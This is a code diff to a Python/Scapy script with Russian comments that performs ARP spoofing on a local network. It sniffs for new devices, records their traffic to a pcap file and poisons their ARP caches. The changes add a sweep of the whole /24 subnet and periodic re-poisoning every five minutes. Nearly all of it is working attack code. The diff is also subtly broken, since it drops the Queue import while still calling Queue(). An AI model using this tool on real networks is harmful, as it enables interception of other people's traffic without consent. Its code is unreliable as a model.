@@ -3,7 +3,8 @@ import time
 import subprocess
 import argparse
 from scapy.all import *
-from queue import Queue
+import queue
+from queue import Empty
 
 from scapy.layers.dhcp import DHCP
 from scapy.layers.inet import IP
@@ -29,6 +30,7 @@ def arp_spoof(target_ip, target_mac, spoof_ip, spoof_mac):
   arp_packet = ARP(op=2, hwsrc=spoof_mac, psrc=spoof_ip, hwdst=target_mac, pdst=target_ip)
   send(arp_packet, verbose=0)
   print(f"ARP-подделка: {spoof_ip} ({spoof_mac}) -> {target_ip} ({target_mac})")
+  print(arp_packet.show())
 
 def sniff_and_find_new_devices(interface="eth0", queue=None, pcap_name="captured_traffic.pcap"):
   """
@@ -39,7 +41,7 @@ def sniff_and_find_new_devices(interface="eth0", queue=None, pcap_name="captured
   pktdump = PcapWriter(pcap_name, append=True, sync=True)
 
   # Функция для обработки пакетов
-  def packet_handler(packet, pcap_name):
+  def packet_handler(packet):
     nonlocal queue
 
     if packet.haslayer(DHCP) or packet.haslayer(ARP):
@@ -90,6 +92,20 @@ def restart_network_interface(interface):
     print("Сетевой интерфейс перезапущен.")
   except FileNotFoundError as e:
     print(f"Ошибка: {e}")
+    
+def send_arp_requests(interface="eth0"):
+  """
+  Функция для отправки массовых ARP-запросов.
+  """
+  # IP-адрес сети (например, 192.168.1.0/24)
+  network = str(get_if_addr(interface)).rpartition(".")[0]+".0/24"
+  for i in range(1, 255):
+    target_ip = str(get_if_addr(interface)).rpartition(".")[0] + f".{i}"
+    arp_packet = ARP(op=1, pdst=target_ip, hwsrc=get_if_hwaddr(interface), psrc=get_if_addr(interface))
+    print(arp_packet.show())
+    sendp(arp_packet, iface=interface, verbose=0)
+    print(f"ARP-запрос отправлен на {target_ip}")
+    time.sleep(0.1) # небольшая задержка между запросами
 
 def main():
   check_privileges()
@@ -105,6 +121,9 @@ def main():
   spoof_ip = get_if_addr(interface)
   spoof_mac = get_if_hwaddr(interface)
   pcap_name = args.w
+  
+  # Отправляем массовые ARP-запросы
+  send_arp_requests(interface)
 
   # Создаем очередь для передачи данных
   queue = Queue()
@@ -113,6 +132,10 @@ def main():
   sniff_thread = threading.Thread(target=sniff_and_find_new_devices, args=(interface, queue, pcap_name))
   sniff_thread.daemon = True  # Делаем поток фоновым
   sniff_thread.start()
+  
+  old_list = []
+  # Словарь для хранения времени последней ARP-подделки для каждого устройства
+  last_spoof_time = {}
 
   while True:
     try:
@@ -120,7 +143,19 @@ def main():
       target_ip, target_mac = queue.get(timeout=1)
       # Отправляем ARP-подделку
       arp_spoof(target_ip, target_mac, spoof_ip, spoof_mac)
-    except queue.Empty:
+      if target_ip not in old_list:
+        # Добавляем устройство в очередь
+        old_list.append(target_ip)
+        # Отправляем ARP-подделку для нового устройства сразу
+        arp_spoof(target_ip, target_mac, spoof_ip, spoof_mac)
+        last_spoof_time[target_ip] = time.time()
+      else:
+        # Проверяем время последней ARP-подделки для этого устройства
+        if target_ip in last_spoof_time and time.time() - last_spoof_time[target_ip] >= 300:
+          # Отправляем ARP-подделку, если прошло более 5 минут
+          arp_spoof(target_ip, target_mac, spoof_ip, spoof_mac)
+          last_spoof_time[target_ip] = time.time()
+    except Empty:
       # Ожидаем новые данные
       pass
     except OSError as e:
